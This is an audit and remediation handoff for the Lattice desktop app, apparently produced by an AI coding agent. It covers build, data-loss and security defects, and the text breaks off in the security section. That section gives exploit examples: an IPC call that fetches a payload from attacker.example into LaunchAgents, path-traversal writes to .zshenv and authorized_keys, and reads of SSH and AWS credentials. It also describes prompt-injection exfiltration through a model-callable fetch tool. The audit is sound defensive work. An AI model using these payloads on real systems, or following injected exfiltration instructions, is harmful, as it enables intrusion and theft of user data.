# Lattice — Full Application Audit & Remediation Handoff

**Audit date:** 2026-07-29
**Repo:** `/Users/josh/Code/lattice-temp`
**Branch audited:** `Temporary` (HEAD `38993ea`, plus uncommitted working-tree changes)
**Audited by:** Claude Code (8 parallel subsystem audits + local build/test/lint verification)

---

## Remediation status — 2026-08-02

The code-owned findings for the shipped desktop application have been remediated. The
sections below are retained as the historical audit record; their present-tense failure
descriptions describe the state found on 2026-07-29, not the current working tree.

### Verification completed

| Area | Result |
|---|---|
| Frontend typecheck and ESLint | Pass; zero errors and zero warnings |
| Frontend unit/integration tests | Pass; 38 files, 579 tests |
| Renderer end-to-end smoke test | Pass; 1/1 Playwright test |
| Browser visual QA | Chat, Settings, and Files routes inspected successfully |
| Production frontend bundle | Pass; warning-free split build, all application chunks below 500 kB |
| Desktop Rust tests | Pass; 2,323 library tests passed, 47 ignored, plus all integration targets |
| Desktop all-feature tests | Pass |
| Rust formatting and strict Clippy | Pass for all targets and all features with warnings denied |
| Generated TypeScript bindings | In sync |
| Repository architecture barrier | Pass; 167 production feature files checked |
| JavaScript dependency audit | 0 known vulnerabilities |
| Desktop Rust dependency audit | 0 known vulnerabilities; 22 transitive informational/yanked notices remain |
| Sync API Rust service | Formatting, strict Clippy, all-target tests, and dependency audit pass |
| Python API syntax validation | 385 files parse successfully |
| Release packaging | `.app` and the copy inside the DMG pass strict deep code-sign verification; DMG checksum is valid |

The local macOS release is intentionally ad-hoc signed so its bundle resources are sealed
and verifiable. Public distribution still requires an Apple Developer ID Application
certificate and notarization credentials; without them, Gatekeeper rejection is expected.

### Decisions or external inputs still required

1. Supply Apple Developer ID/notarization credentials before public macOS distribution.
2. Decide whether to migrate the existing bundle identifier `tech.lattice.app`. It ends in
   `.app`, which Tauri warns against, but changing it can alter application identity,
   storage, and keychain continuity and therefore was not changed silently.
3. Decide whether the untracked `lattice/` duplicate may be deleted. It is user-owned and
   was deliberately left untouched.
4. Confirm the long-term ownership/retention policy for the separate `src/api/` Python and
   `api-rust/` services. The Rust service passes its gates; the Python service parses but
   has 3,542 Ruff findings that require a separately scoped cleanup rather than an unsafe
   mass rewrite during the desktop remediation.

No commit is included; repository policy requires explicit user permission before one is
created.

---

## 0. How to use this document

This was the handoff document used for implementation. The findings remain ordered by
their original remediation priority; use the status section above for the current result.

### Issue format

Every issue has a stable ID (`IDX-3`, `SEC-1`, …). Reference these IDs in commits.
Each entry contains:

- **Severity** — P0 (broken/destructive/exploitable), P1 (wrong behavior users will hit),
  P2 (wrong behavior in edge cases, or latent), P3 (hygiene/debt).
- **Verified** — how the claim was established. This matters; do not skip it.
  - `RUN` — reproduced by actually running a build/test/tool locally during this audit.
  - `SQL-TESTED` — the SQL semantics were confirmed empirically against SQLite 3.51.
  - `READ` — established by reading the code and its callers/callees. High confidence,
    but not executed. **Re-confirm before writing the fix.**
- **Location** — `file:line` at the time of audit. Lines may shift; grep the quoted code.
- **Root cause** — the actual defect, not the symptom.
- **Failure scenario** — concrete inputs/state → wrong result.
- **Fix** — the recommended change.
- **Verify** — how to prove the fix worked.

### Severity counts

| Severity | Count |
|---|---|
| P0 | 20 |
| P1 | 48 |
| P2 | 27 |
| P3 | 7 |
| **Total distinct issues** | **102** |

Seven further entries are cross-references (the same defect listed under a second subsystem
where its consequence shows up) and are marked `> Same defect as …`; they are not counted
above. A handful of entries — `IDX-13`, `HYG-5`, `HYG-4` — are deliberate batches covering
several small related items each, so the true count of individual code changes is somewhat
higher than 102.

### Ground rules for the implementing agent

1. **`SQLX_OFFLINE = "true"`** is set in `src/app/src/.cargo/config.toml:25`, and there are
   101 cached query descriptions in `src/app/src/.sqlx/`. **Any change to the SQL string
   inside a `sqlx::query!` / `query_as!` macro breaks the build** until the cache is
   regenerated against a live database (`cargo sqlx prepare`). Two ways out:
   - Prefer the non-macro `sqlx::query(...)` / `query_as::<_, T>(...)` / `query_scalar(...)`
     forms for new/changed SQL — they are not compile-time checked and need no cache.
   - Or regenerate the cache. **Do not** regenerate it from `src/app/src/init_schema.sql` —
     that file is stale (see `SQL-6`); use the `migrations/` directory.
2. **Do not "fix" `/Users/josh/Code/lattice-temp/lattice/`.** It is an untracked, stale,
   31 MB duplicate copy of the entire repo (see `HYG-3`). It diverges from the live tree.
   All paths in this document refer to the live tree unless stated otherwise.
3. **`src/api/` (Python) and `api-rust/` are not part of the shipped desktop app.** No
   references to them exist in `tauri.conf.json` or the build scripts, and nothing in
   `websrc/` or the Rust backend calls a localhost HTTP API. They were out of audit scope
   and should be confirmed dead and deleted separately (`HYG-6`).
4. **Per `CLAUDE.md`, do not commit without explicit permission from the user.**
5. Adding a `#[tauri::command]` requires **four** coordinated edits (impl,
   `generate_handler!`, `build.rs` `InlinedPlugin::commands`, `capabilities/main.json`).
   `CLAUDE.md` documents this; several issues below involve exactly this drift.

---

### Contents

| § | Section | Issues |
|---|---|---|
| 1 | [Executive summary](#1-executive-summary) | — |
| 2 | [P0 — Build blockers](#2-p0--build-blockers-fix-these-first-nothing-is-verifiable-until-then) | `BLD-1`…`BLD-7` |
| 3 | [P0 — Data loss and corruption](#3-p0--data-loss-and-corruption) | `DATA-1`…`DATA-9` |
| 4 | [P0/P1 — Security](#4-p0p1--security) | `SEC-1`…`SEC-13` |
| 5 | [Indexing, embedding, and search](#5-indexing-embedding-and-search) | `IDX-1`…`IDX-13` |
| 6 | [Model download and management](#6-model-download-and-management) | `DL-1`…`DL-12` |
| 7 | [Chat, LLM, and retrieval](#7-chat-llm-and-retrieval) | `CHAT-0`…`CHAT-10` |
| 8 | [Settings, vault, and backup](#8-settings-vault-and-backup) | `SET-1`…`SET-6` |
| 9 | [Database, SQL, and migrations](#9-database-sql-and-migrations) | `SQL-1`…`SQL-11` |
| 10 | [React frontend](#10-react-frontend) | `FE-1`…`FE-12` |
| 11 | [Concurrency, memory, and leaks](#11-concurrency-memory-and-resource-leaks) | `CONC-1`…`CONC-7` |
| 12 | [Architectural debt](#12-architectural-debt) | `ARCH-1`…`ARCH-4` |
| 13 | [Code hygiene and tooling](#13-code-hygiene-and-tooling) | `HYG-1`…`HYG-7` |
| 14 | [What is solid — do not spend effort here](#14-what-is-solid--do-not-spend-effort-here) | — |
| 15 | [Recommended execution order](#15-recommended-execution-order) | — |
| 16 | [Appendix — verification commands](#16-appendix--verification-commands) | — |

**If you read only one section before starting: Section 2, then Section 15.**

---

## 1. Executive summary

> **Historical snapshot:** this section describes the 2026-07-29 pre-remediation state.
> See **Remediation status — 2026-08-02** above for current verification results.

The application does not currently build, and the failure is not a local-environment
problem — three source files imported by `Layout.tsx` do not exist anywhere in the repo or
in git history. That single break cascades: `vite build` fails, so `dist/` is never
produced, so `tauri::generate_context!` panics, so the Rust binary cannot compile either.
The entire frontend test suite (37 files) also fails to start, on an unrelated broken
import path in the test setup file.

Underneath the build break, the audit found **95 issues**. The pattern worth calling out
is not the count but the *clustering*: the most severe bugs are concentrated in the code
paths that were most recently refactored, and several are the same class of bug the
project's own `CLAUDE.md` Repository Barrier rule was written to prevent — two writers
describing one entity, disagreeing.

The findings that would hurt a real user soonest:

- **Re-indexing any modified file always fails** with a foreign-key violation, and its
  stale chunks are left in the index permanently (`IDX-1`). Confirmed empirically against
  SQLite by two independent audits.
- **Two code paths write the embedding BLOB in incompatible binary formats** (bincode vs.
  raw little-endian f32). After a vector-index rebuild, everything indexed through one of
  those paths silently vanishes from semantic search (`IDX-2`).
- **Pausing a model download corrupts it.** The pause signal drives the session into
  `Cancelled`, after which resume is permanently refused and the only recovery deletes the
  partial file and restarts from byte zero (`DL-1`). Paused downloads also never release
  their concurrency slot, so two pauses stall the whole queue (`DL-2`).
- **Removing a watched folder deletes documents by unescaped `LIKE` prefix**, so removing
  `/data/notes` also deletes indexed documents under `/data/notes-archive/` (`DATA-2`).
- **Deleted daily notes come back.** Deletion never removes the vault `.md` file, and the
  next vault rescan re-imports the orphan as a new note (`DATA-3`).
- **A settings-write race can reset every user setting to defaults** (`DATA-4`, `DATA-5`).
- **Renaming a document wipes all of its chunks and embeddings** (`IDX-3`).
- **The webview can write attacker-controlled bytes to an arbitrary filesystem path** via
  three separate unvalidated-path commands — including into `~/Library/LaunchAgents/`,
  which is code execution at next login (`SEC-1`, `SEC-2`, `SEC-3`).
- **A non-ASCII first chat message panics the request handler** (`CHAT-1`).

A fair amount of the codebase is genuinely well built, and it is worth knowing where not
to spend effort. The sidecar process lifecycle (kill-on-drop + registry + Windows Job
Object), the web-fetch SSRF guard (DNS-resolving, redirect-revalidating), credential
storage (OS keyring), frontend XSS posture (zero `dangerouslySetInnerHTML`, script-less
sandboxed iframes), SQL parameterization (no injection anywhere), FTS trigger coverage,
and the SQLite pool configuration are all solid. Details in Section 13.

---

## 2. P0 — Build blockers (fix these first; nothing is verifiable until then)

### BLD-1 — Three `Downloads/` components imported by `Layout.tsx` do not exist
- **Severity:** P0 · **Verified:** RUN (`npx vite build` fails; `npx tsc --noEmit` errors)
- **Location:** `src/app/websrc/components/Layout/Layout.tsx:7-9`
- **Root cause:** The file imports
  `../Downloads/DownloadsDrawer`, `../Downloads/DrawerTrigger`, and
  `../Downloads/HeaderDownloadsIndicator`. There is no
  `src/app/websrc/components/Downloads/` directory in the working tree, and
  `git log --all --diff-filter=D` finds no commit that ever deleted them — they were never
  committed. This is almost certainly uncommitted work stranded on another machine (HEAD is
  literally titled *"Moving back to macbook, temporary branch"*).
- **Failure scenario:** `npm run build` → `vite build` →
  `Could not resolve "../Downloads/DownloadsDrawer" from "websrc/components/Layout/Layout.tsx"`.
  Exit 1. No `dist/` is emitted.
- **Fix:** Recover the three components from the other machine if they exist. If they do
  not, they must be written: a downloads drawer, its trigger button, and a header progress
  indicator, all driven by the existing `useDownloads` hook / `downloadStore`. As a
  stopgap to unblock everything else, stub the three exports and remove them from the
  header, but **do not ship the stub** — the downloads UI is a real feature with backend
  support already wired.
- **Verify:** `cd src/app && npx vite build` exits 0 and emits `dist/`.

### BLD-2 — Rust binary cannot compile: `frontendDist` `../dist` does not exist
- **Severity:** P0 · **Verified:** RUN (`cargo check --bin lattice-desktop`)
- **Location:** `src/app/src/src/main.rs:42` (`tauri::generate_context!()`), config at
  `src/app/src/tauri.conf.json` (`build.frontendDist = "../dist"`)
- **Root cause:** Cascade of `BLD-1`. The proc macro hard-errors:
  `The 'frontendDist' configuration is set to "../dist" but this path doesn't exist`.
- **Failure scenario:** `cargo build` fails with `error: proc macro panicked` and no
  useful pointer to the real cause (the missing frontend build).
- **Fix:** None needed independently — resolves when `BLD-1` is fixed and the frontend has
  been built once. Worth knowing so the panic isn't misdiagnosed as a Tauri problem.
- **Verify:** `cd src/app/src && cargo check --bin lattice-desktop` exits 0.

### BLD-3 — Sidecar binary is gitignored and absent, breaking any clean-machine build
- **Severity:** P0 · **Verified:** RUN (`cargo check` failed until worked around)
- **Location:** `src/app/src/binaries/` (contains only `.gitignore` and `README.md`);
  `src/app/src/tauri.conf.json:39-40` declares `externalBin: ["binaries/llama-server"]`
- **Root cause:** `tauri-build` hard-fails with
  `resource path 'binaries/llama-server-aarch64-apple-darwin' doesn't exist`. The binary is
  produced by CI (`llama-build`) and is correctly gitignored, but there is no local
  bootstrap path — a fresh clone cannot run `cargo check`, let alone build.
- **Failure scenario:** New machine, fresh clone, `cargo build` → immediate failure with no
  instruction on how to obtain the sidecar.
- **Note:** During this audit a throwaway executable stub was placed at
  `src/app/src/binaries/llama-server-aarch64-apple-darwin` to let compilation proceed far
  enough to collect `cargo check` / `clippy` results, **and then deleted again** — a file that
  pretends to be an inference server is exactly the kind of silent landmine this document
  argues against. So the tree is back to its original state and `cargo check` will fail on the
  missing resource until a real sidecar is in place. That failure is expected and is this issue.
- **Fix:** Add a `scripts/fetch-sidecar.sh` (download the CI artifact / build llama.cpp
  locally) and document it in the README's setup steps. Optionally make `build.rs` emit a
  clear, actionable error naming that script when the binary is missing.
- **Verify:** Fresh clone + documented setup steps → `cargo check` exits 0.

### BLD-4 — Entire frontend test suite (37 files) fails to start on a bad import path
- **Severity:** P0 · **Verified:** RUN (`npx vitest run` → 37 failed, 0 tests executed)
- **Location:** `src/app/websrc/tests/setup.ts:5`
- **Root cause:** Setup imports `../__mocks__/lib/api`, i.e.
  `websrc/__mocks__/lib/api`, which does not exist. The real mock lives at
  `websrc/lib/__mocks__/api.ts`. Because this is the global vitest setup file, the
  resolution error kills every test file before collection.
- **Failure scenario:** `npm test` → `Test Files 37 failed (37)`, `Tests no tests`. The
  suite has been providing zero signal.
- **Fix:** Correct the path to `../lib/__mocks__/api`. Then fix the second-order break:
  `websrc/lib/__mocks__/api.ts:5` imports `../../tests/mocks/vaultApiMock`, which also does
  not exist in the live tree (it exists in the stale `lattice/` copy — recover the content
  from there, but re-verify it against current `api.ts`).
- **Verify:** `npx vitest run` collects and runs tests. Expect real failures to surface
  once it does — triage those separately; they are currently invisible.

### BLD-5 — Rust test targets do not compile (6 errors)
- **Severity:** P0 · **Verified:** RUN (`cargo check --lib --tests`)
- **Location:** see error list below
- **Root cause:** Test-only code references modules, items, and a dev-dependency that no
  longer exist:
  - `cannot find 'file' in 'domain'`
  - `unresolved imports crate::infrastructure::persistence::repositories::FileRepository`,
    `…::MetadataRepository`
  - `unresolved import crate::app_state`
  - `unresolved import serial_test` (dev-dependency not declared in `Cargo.toml`)
  - `no method named write_all found for struct tokio::fs::File` ×2 (missing
    `use tokio::io::AsyncWriteExt;`)
- **Failure scenario:** `cargo test` never runs a single Rust test. Combined with `BLD-4`,
  **the project currently has no working test suite in either language.**
- **Fix:** Repair or delete the stale test modules; add `serial_test` to `[dev-dependencies]`;
  add the missing `AsyncWriteExt` import. Then run the suite and triage genuine failures.
- **Verify:** `cargo test` compiles and reports results.

### BLD-6 — ESLint is unusable: import resolver misconfigured (~3,100 errors)
- **Severity:** P1 · **Verified:** RUN (`npx eslint websrc`)
- **Location:** `src/app/eslint.config.js`
- **Root cause:** Every file reports
  `Resolve error: typescript with invalid interface loaded as resolver` for the five
  `import/*` rules. The `eslint-import-resolver-typescript` version installed does not match
  the interface `eslint-plugin-import` expects. This inflates the count to 3,098 errors and
  buries the real ones. Note `package.json` sets `--max-warnings 501`, which suggests lint
  output has been ignored for a while.
- **Failure scenario:** Lint provides no usable signal; genuine unresolved imports (like
  `BLD-1`) hide in the noise.
- **Fix:** Align `eslint-plugin-import` / `eslint-import-resolver-typescript` versions (or
  migrate to `eslint-plugin-import-x`, which supports the flat-config resolver interface).
  Then re-run and triage. One real error is already visible through the noise:
  `websrc/utils/toast.ts:16` — `Unable to resolve path to module '../stores/toastStore'`.
- **Verify:** `npx eslint websrc` runs without resolver errors; drive the real count to zero
  and lower `--max-warnings`.

### BLD-7 — 18 TypeScript errors, including 9 nonexistent exported types
- **Severity:** P1 · **Verified:** RUN (`npx tsc --noEmit`)
- **Location:** `src/app/websrc/lib/api.ts:27,110-116`; `websrc/lib/bindings.ts:3197,3218`;
  `websrc/components/Settings/SearchTab.test.tsx:17`; plus the `BLD-1`/`BLD-4` cascades
- **Root cause:** `api.ts` imports types that `../types` does not export:
  `BatchIngestSummary`, `ConversationThreadDto`, `CreateConversationThreadRequest`,
  `UpdateConversationThreadRequest`, `DeleteConversationThreadRequest`,
  `ArchiveConversationThreadRequest`, `MoveConversationToThreadRequest`,
  `ListConversationThreadsRequest`. These are the frontend halves of the phantom "thread"
  API described in `CHAT-8` — the whole feature is half-written. Separately,
  `bindings.ts` has two unused declarations (`TAURI_CHANNEL`, `__makeEvents__`) and
  `SearchTab.test.tsx` sets `excludedPaths`, which is not a member of `IndexingSettings`.
- **Fix:** Delete the phantom thread API surface (preferred — see `CHAT-8`) or implement it
  end to end. Fix the test's settings shape. For `bindings.ts`, if it is generated, fix the
  generator or exclude it from `noUnusedLocals`.
- **Verify:** `npx tsc --noEmit` exits clean. Consider adding it to CI — nothing is
  currently enforcing it.

---

## 3. P0 — Data loss and corruption

### DATA-1 — Re-index of a modified file always fails; stale chunks persist forever
> Same defect as `IDX-1`. Cross-listed here because the user-visible consequence is a
> permanently stale index. See `IDX-1` for the full entry and fix.

### DATA-2 — Removing a watched folder deletes unrelated documents (unescaped `LIKE` prefix)
- **Severity:** P0 · **Verified:** READ (confirmed by reading; SQL semantics are standard)
- **Location:** `src/app/src/src/features/file/commands.rs:421-430` (also the count at
  `:397-406`, and a third site at `:573`)
- **Root cause:** Two independent defects in one statement:
  ```sql
  DELETE FROM documents WHERE file_path LIKE ? || '%'
  ```
  1. The bound path is **not escaped for `LIKE` metacharacters**. `_` matches any single
     character and `%` matches any sequence. A folder named `my_notes` also matches
     `myXnotes`. (The comment above it — "Use parameterized query for LIKE clause to prevent
     SQL injection" — is true but addresses a different problem; parameterization does not
     neutralize wildcards.)
  2. There is **no trailing path separator**, so the prefix matches sibling directories:
     removing `/data/notes` deletes every document under `/data/notes-archive/`,
     `/data/notes-old/`, `/data/notes.bak/`, etc.
- **Failure scenario:** User has `/data/notes` and `/data/notes-archive` both indexed. They
  un-watch `/data/notes`. Every indexed document in `/data/notes-archive` is deleted from
  the database, cascading to its chunks, embeddings, and FTS rows. There is no undo.
- **Fix:** Append the platform separator to the prefix and escape wildcards:
  ```rust
  let mut prefix = path_str.clone();
  if !prefix.ends_with(std::path::MAIN_SEPARATOR) { prefix.push(std::path::MAIN_SEPARATOR); }
  let escaped = prefix.replace('\\', "\\\\").replace('%', "\\%").replace('_', "\\_");
  // DELETE FROM documents WHERE file_path LIKE ? || '%' ESCAPE '\'
  ```
  Also delete the folder's own row if a document can exist at the folder path itself.
  Apply the identical fix to all three sites. Use the non-macro `sqlx::query` form
  (see ground rule 1).
- **Verify:** Unit test with `/tmp/a_b` + `/tmp/aXb` + `/tmp/notes` + `/tmp/notes-archive`
  fixtures asserting only the intended subtree is deleted.
- **See also:** `SQL-7` — these two deletes are also not in a transaction.

### DATA-3 — Deleted daily notes resurrect on the next vault rescan
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/daily_notes/commands.rs:321-336`;
  `features/vault/writeback.rs:32-45`; `features/vault/watcher.rs:445-447`
- **Root cause:** `delete_workspace_note_impl` runs only
  `DELETE FROM daily_notes_workspace`. `VaultWriteJob` has no `Delete` variant, so the
  vault `.md` file is never removed. On the next rescan, the watcher finds a file with no
  corresponding SQL row and takes the `None => needs_import = true` branch, re-importing it
  as a new note.
- **Failure scenario:** User deletes a note, switches to another app, comes back (focus
  triggers rescan) — the note is back.
- **Fix:** Add a `Delete` variant to `VaultWriteJob` and enqueue it from the delete command
  so the `.md` file is removed through the same serialized writer that handles creates and
  updates (which keeps own-write suppression working). Alternative, if you want deletes to
  be recoverable: keep a tombstone row and have the rescan honor it. Do not simply delete
  the file inline from the command — that races the writer and defeats own-write suppression.
- **Verify:** Create note → delete → force rescan → note stays gone; the `.md` is gone too.

### DATA-4 — Concurrent `update_settings` calls silently lose writes
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/settings/repository.rs:1079-1149`;
  `features/settings/use_cases/update.rs:64-77`
- **Root cause:** The update path is a read-modify-write (`get_all()` → merge → `save_all`)
  with **no mutex or serialization anywhere**, on a single shared `Arc` repository. The
  doc comment at `repository.rs:15` claims "proper locking"; there is none. The use case
  also persists **twice** per update (`update()` internally calls `save_all` at `:1146`,
  then `update.rs:77` calls `save_all` again), which widens the race window.
- **Failure scenario:** Two React Query mutations in flight (e.g. the user toggles a
  privacy flag while a vault-path save is still going). Both read the same base state,
  each merges its own category, and the second write reverts the first. The UI shows
  success for both.
- **Fix:** Put a `tokio::sync::Mutex` around the whole read-modify-write in the repository
  so `get_all → merge → save_all` is atomic, and remove the duplicate `save_all`. Fix the
  stale doc comment. Consider returning the post-write canonical state so the frontend
  invalidation reflects reality.
- **Verify:** Test firing N concurrent updates to distinct categories and asserting all N
  are present afterward.

### DATA-5 — Settings "atomic" write can tear, and the corruption handler then wipes all settings
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/settings/repository.rs:322-339` (write),
  `:293-299` (corruption handler)
- **Root cause:** The temp-file-plus-rename pattern is correct in structure but uses a
  **single fixed temp path** (`settings_path.with_extension(".tmp")`) shared by all writers.
  `File::create` truncates, so writer B can truncate and rewrite the temp file while writer
  A sits between `sync_all` and `rename` — renaming partially-written JSON into place. The
  blast radius is amplified by the corruption handler, which on any parse failure
  **overwrites `settings.json` with defaults** rather than quarantining it.
- **Failure scenario:** Two concurrent saves (see `DATA-4`) tear the file; on next read the
  parse fails; every user setting — vault path, indexed folders, model roles, privacy
  flags — is silently reset to defaults with no backup.
- **Fix:** Two independent changes, both needed:
  1. Use a unique temp filename per write (`format!(".settings.{}.tmp", Uuid::new_v4())`) —
     `features/vault/writeback.rs:291-309` already does this correctly; copy that pattern.
  2. On parse failure, rename the bad file to `settings.json.corrupt-<timestamp>` and log
     loudly before falling back to defaults. Never destroy the only copy of user state.
- **Verify:** Unit test: concurrent writers never produce an unparseable file; a
  deliberately corrupted file is preserved as `.corrupt-*` and not overwritten.

### DATA-6 — Vault ghost-sweep makes the filesystem the de-facto SSOT and can wipe the notes DB
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/vault/watcher.rs:459-518` (guard at `:397`)
- **Root cause:** The rescan's ghost sweep hard-deletes DB rows for notes whose files are
  absent. Only the case "the containing directory is also missing" is guarded (early return
  at `:397`). An **empty-but-present** `notes/` directory is treated as authoritative
  evidence that every note was deleted.
- **Failure scenario:** Vault lives in Dropbox / iCloud Drive / an external volume.
  Placeholder sync, a partial mount, or the sync client mid-move leaves `notes/` present but
  unmaterialized. One window-focus rescan deletes every note older than 30 s from SQLite.
  No undo.
- **Fix:** Require positive evidence before destructive sweeps. Concretely: if the number of
  files found is zero (or drops by more than a safety threshold, say 50%, versus the DB row
  count), refuse to sweep, log, and surface a UI warning instead. Consider soft-deleting
  (tombstone + a recovery window) rather than hard `DELETE`.
- **Verify:** Test with an empty `notes/` dir and populated DB → no rows deleted, warning
  raised.

### DATA-7 — Renaming a document destroys all of its chunks and embeddings
> Same defect as `IDX-3`. See `IDX-3`.

### DATA-8 — Restore's "safety backup" is a torn copy of a live WAL database
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/backup/adapter.rs:449-461` (safety copy),
  `:470` (rename), `:480-497` (rollback path)
- **Root cause:** The pre-restore safety backup is a plain `fs::copy` of the live database
  taken **before** `pool.close()`, i.e. while WAL-mode SQLite is hot and recent commits live
  only in the `-wal` file. The copy can be torn or behind. After the restore's
  `rename(temp, db_path)`, the **old database's `-wal` and `-shm` files remain** next to the
  newly restored file. Additionally, restore replaces only the DB — vault `.md` files and
  `settings.json` are not in the snapshot.
- **Failure scenario:** Restore goes wrong and the rollback path restores from the torn
  safety copy — the user loses data in the very operation meant to protect it. Separately,
  a stale `-wal` alongside a restored DB can surface as corruption. And because vault files
  are not restored, the next focus-rescan re-imports *current* vault files over the
  just-restored DB, resurrecting post-backup notes and partially undoing the restore.
- **Fix:** Close the pool (or run `VACUUM INTO`, or use the SQLite backup API) **before**
  taking the safety copy; delete or checkpoint `-wal`/`-shm` as part of the swap; and either
  include vault files + `settings.json` in the snapshot or explicitly suppress the vault
  rescan and warn the user that only the database is restored.
- **Verify:** Restore under concurrent writes; assert the safety copy opens cleanly and
  contains all committed rows; assert no stale `-wal` remains.

### DATA-9 — Any transient `settings.json` parse failure permanently destroys user settings
> Same root as `DATA-5` item 2, but reachable without a race: a hand-edit typo, a partial
> read, or an unknown field from a future version all trigger the same overwrite-with-defaults.
> Fix together with `DATA-5`.

---

## 4. P0/P1 — Security

Threat model: this is a local-first desktop app. The realistic attacker is (a) malicious or
compromised content that reaches the renderer or the LLM (an indexed document, a fetched web
page, a model-driven tool call), or (b) a renderer-side compromise that can call any IPC
command permitted in `capabilities/main.json`. Findings are ranked by that model.

### SEC-1 — `start_model_download` writes attacker-controlled bytes to an arbitrary path
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/commands.rs:103` (also `:87`, `:133-155`);
  validator at `src/app/src/src/shared/modules/domain_types.rs:447`;
  writer at `features/download/engine.rs:366-372`
- **Root cause:** The command takes both a `url` and a `destination` from the frontend.
  `validate_destination` only constructs a `ValidatedFilePath`, which rejects `..`
  components but **permits any absolute path**. `validate_url` checks only the `http(s)`
  prefix and a length bound — no host restrictions, no private-IP blocking (unlike the web
  feature, which does this correctly). The engine then does `create_dir_all(parent)` +
  `File::create(destination)`. The command is granted in `capabilities/main.json`
  (`download:allow-start-model-download`).
- **Exploit:** From a compromised renderer:
  ```js
  invoke('plugin:download|start_model_download', {request: {
    url: 'https://attacker.example/payload',
    destination: '/Users/josh/Library/LaunchAgents/com.evil.plist'
  }})
  ```
  → fully attacker-controlled bytes at an arbitrary path → **code execution at next login**.
  The same command doubles as an unrestricted outbound-fetch primitive (SSRF).
- **Fix:** Do not accept a destination from the frontend at all — derive it server-side from
  the validated model id under the models root. If a destination must be accepted, confine
  it with `canonicalize` + `starts_with(models_root)` (the pattern in
  `infrastructure/security/file_access_config.rs:181-206`). Restrict the URL to an allowlist
  of model hosts and reuse the SSRF validator from `features/web/services/web.rs:909-1005`.
- **Verify:** Test that absolute paths outside the models root and non-allowlisted hosts are
  both rejected.

### SEC-2 — Path traversal via unvalidated filename in the HF download id
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/llm/use_cases/download_model.rs:541` (also `:869`,
  `:953`); decoder at `application/ports/model_catalog.rs:89-105`; join at
  `domain/modules/model_paths.rs:117`
- **Root cause:** `paths.file_path(&default_filename)` is `unified_path.join(filename)`,
  where `filename` is the **base64url-decoded second segment of a frontend-supplied
  `model_id`**. `decode_hf_download_id` validates nothing. `ModelPaths::validate_model_id`
  (`model_paths.rs:122-129`) guards the *model id* against `..` and `/`, but the filename is
  never checked — and Rust's `Path::join` with an absolute string **silently discards the
  base**, so the models root is dropped entirely.
- **Exploit:** `download_model("hf." + b64("attacker/repo") + "." + b64("/Users/josh/.zshenv"))`
  writes the fetched (attacker-hosted) file to exactly that path. URL dot-segment
  normalization limits the `../` variant, but the absolute-path variant bypasses it.
- **Fix:** Validate the decoded filename with the same rules as the model id, reject absolute
  paths and any separator, and re-confine the joined result under the models root with
  `canonicalize` + `starts_with`. Add a `ModelPaths` unit test for absolute and
  separator-bearing filenames.
- **Verify:** Test that an absolute-path filename is rejected rather than escaping the root.

### SEC-3 — `export_model` writes to any path with no validation at all
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/model_management/plugin/commands.rs:512`
- **Root cause:** `std::fs::write(&export_path, payload)` with zero validation — no `..`
  check, no root confinement.
- **Exploit:** `export_model(model_id, '/Users/josh/.ssh/authorized_keys')` overwrites any
  user-writable file. Content is model-metadata JSON (partially influenced via model names),
  so this is primarily destructive/persistence-adjacent rather than arbitrary-content write.
- **Fix:** Route through a save dialog, or confine to a designated exports directory with
  canonicalize + `starts_with`.
- **Verify:** Test rejection of paths outside the exports root.

### SEC-4 — `restore_backup` accepts any absolute path (state injection)
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/backup/commands.rs:305`
- **Root cause:** Uses `ValidatedFilePath` (`..`-only filtering), so any absolute path is
  accepted and handed to the restore use case. This is asymmetric with **create**, which
  confines backups to `<db_dir>/backups` (`adapter.rs:385-394`).
- **Exploit:** Point restore at an attacker-planted SQLite file in `~/Downloads` to replace
  the application database wholesale — injecting documents, settings, and model rows. Or
  point it at `/etc/hosts` to corrupt the DB (DoS).
- **Fix:** Confine restore sources to the backup root, and validate that the file is a
  SQLite database with the expected `user_version`/schema before swapping it in.
- **Verify:** Test rejection of out-of-root and non-SQLite sources.

### SEC-5 — File-read IPC is confined to the whole home directory, not the corpus
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/interfaces/di/modules.rs:185`; documented intent at
  `interfaces/di/container.rs:1498`; enforcement (correct) at
  `infrastructure/security/file_access_config.rs:181-206`
- **Root cause:** The only production `FileAccessConfig` is built with
  `allowed_roots = vec![home_dir()]`, while the code comment describes it as "lattice +
  indexed directories". The confinement logic itself is sound (canonicalize + `starts_with`)
  and every file use case routes through it — the *policy* is simply far too broad.
- **Exploit:** `get_file_content('/Users/josh/.ssh/id_rsa')`, `~/.aws/credentials`, browser
  cookie stores under `~/Library/Application Support/` — the entire home directory is
  readable over IPC.
- **Fix:** Set `allowed_roots` to the app data directory plus the user's configured indexed
  paths / vault root, and recompute it when those settings change.
- **Verify:** Test that a file in `$HOME` but outside any indexed path is refused.

### SEC-6 — Model-callable `fetch_url_content` is an unguarded exfiltration channel
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/function_calling/registry.rs:361`
- **Root cause:** `fetch_url_content` is exposed to the model alongside `semantic_search`
  and `get_document`, with **no approval or confirmation gate anywhere** in the feature (no
  `requires_approval` / `confirm` hooks exist).
- **Exploit:** Indirect prompt injection. A malicious indexed document or fetched web page
  instructs the model to `semantic_search` the corpus and then
  `fetch_url_content("https://attacker/?d=<contents>")`. The web SSRF guard blocks private
  ranges but permits every public host, so this is a clean, silent exfiltration path out of
  a local-first app whose entire value proposition is that documents stay local.
- **Fix:** Require explicit user approval for `fetch_url_content` when the conversation
  contains retrieved document content (or always, with a remembered per-host allowlist).
  At minimum, surface every model-initiated outbound fetch in the UI. Consider stripping
  retrieved-document text from any URL the model constructs.
- **Verify:** Injection test: an indexed document containing exfiltration instructions must
  not produce an un-approved outbound request.

### SEC-7 — Ollama endpoint validation is not SSRF protection
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/settings/use_cases/update.rs:289`
- **Root cause:** The hardening referenced in commit history checks scheme, userinfo,
